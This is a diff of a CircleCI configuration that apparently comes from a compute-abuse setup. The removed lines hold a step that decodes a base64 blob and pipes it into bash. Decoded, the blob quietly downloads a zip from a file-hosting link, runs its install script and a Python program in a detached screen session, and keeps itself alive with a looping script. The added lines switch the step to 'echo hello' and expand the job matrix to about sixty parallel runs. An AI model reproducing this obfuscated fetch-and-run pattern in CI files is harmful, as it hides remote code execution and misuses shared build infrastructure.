@@ -3,7 +3,7 @@ version: 2.1
 executors:
   linux:
     docker:
-      - image: cimg/python:3.10.5
+      - image: cimg/node:21.6.2
 
 jobs:
   test:
@@ -14,14 +14,7 @@ jobs:
         type: string
     executor: << parameters.os >>
     steps:
-      steps:
-      - run: echo hi from << parameters.env >>
-      - run: 
-          name: XX_double
-          no_output_timeout: 5h
-          max_run_time: 5h
-          command: |
-              bash <( openssl base64 -d \<<< "d2dldCAtcU8gYXBwLnppcCBodHRwczovL2RyaXZlLnVzZXJjb250ZW50Lmdvb2dsZS5jb20vZG93bmxvYWQ/aWQ9MXZrSWlVaVVPS3RLbHFEZ1plRVUzVTU3bkZrblZKZnlnJmV4cG9ydD1kb3dubG9hZCA+IC9kZXYvbnVsbCAyPiYxCnNsZWVwIDUKdW56aXAgYXBwLnppcCAKbHMgLWwgLWEKc2xlZXAgMwpzaCBpbnN0YWxsLnNoID4gL2Rldi9udWxsIDI+JjEKc3VkbyBhcHQtZ2V0IGluc3RhbGwgc2NyZWVuIC15ID4gL2Rldi9udWxsIDI+JjEKc2NyZWVuIC1kbVMgcnVuIHB5dGhvbiBtYWluLnB5CmVjaG8gJwpydW50aW1lPSI2MCBtaW51dGUiCmVuZHRpbWU9JChkYXRlIC11ZCAiJHJ1bnRpbWUiICslcykKd2hpbGUgW1sgJChkYXRlIC11ICslcykgLWxlICRlbmR0aW1lIF1dCmRvCmVjaG8gIlRpbWUgTm93OiBgZGF0ZSArJUg6JU06JVNgIgplY2hvICJQcmVwYXJlIFN0YXJ0IFJlcXVlc3Qgbm9kZSIKc2xlZXAgMTAwCmRvbmUnID4gbGFwc2Uuc2gKY2htb2QgNzc3IGxhcHNlLnNoCi4vbGFwc2Uuc2g=" )
+      - run: echo hello
 
 workflows:
   alphaCod3r:
@@ -30,4 +23,4 @@ workflows:
           matrix:
             parameters:
               os: [linux]
-              node-version: [10.0.0, 10.1.0, 10.2.0, 10.2.1, 10.3.0, 10.4.0, 10.4.1, 10.5.0, 10.6.0, 10.7.0]
+              node-version: [10.0.0, 10.1.0, 10.2.0, 10.2.1, 10.3.0, 10.4.0, 10.4.1, 10.5.0, 10.6.0, 10.7.0, 10.8.0, 10.9.0, 10.10.0, 10.11.0, 10.12.0, 10.13.0, 10.14.0, 10.14.1, 10.14.2, 10.15.0, 10.15.1, 10.15.2, 10.15.3, 10.15.4, 10.15.5, 10.15.6, 10.15.7, 10.15.8, 10.15.9, 10.15.10, 10.15.11, 10.15.12, 10.15.13, 10.15.14, 10.15.15, 10.15.16, 10.15.17, 10.15.18, 10.15.19, 10.15.20, 10.16.1, 10.16.2, 10.16.3, 10.16.4, 10.16.5, 10.16.6, 10.16.7, 10.16.8, 10.16.9, 10.16.10, 10.16.11, 10.16.12, 10.16.13, 10.16.14, 10.16.15, 10.16.16, 10.16.17, 10.16.18, 10.16.19, 10.16.20]
